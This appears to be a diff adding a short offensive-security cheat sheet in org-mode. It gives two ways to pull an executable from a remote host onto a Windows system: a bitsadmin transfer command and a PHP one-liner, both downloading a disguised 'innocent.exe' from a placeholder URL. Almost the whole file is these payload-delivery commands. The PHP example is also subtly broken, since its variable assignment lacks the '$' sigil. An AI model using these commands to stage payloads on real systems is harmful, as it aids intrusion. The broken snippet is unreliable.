@@ -1,0 +1,17 @@
+* bitsadmin
+#+BEGIN_EXAMPLE
+bitsadmin /transfer job_name /download /priority foreground http://your.url.here/innocent.exe
+  C:\some\writeable\path\for\your\innocent.exe
+#+END_EXAMPLE
+
+** bitsadmin used to be quite common on windows systems, but less so after 7, i think.
+
+* php
+#+BEGIN_EXAMPLE
+C:\\xampplite\\php\\php.exe -r "
+        booty = file_get_contents(\"http://your.url.here/innocent.exe\"); 
+        file_put_contents(\"innocent.exe\", $booty);
+"
+#+END_EXAMPLE
+
+** path to php.exe can vary, naturally, and isn't on all systems
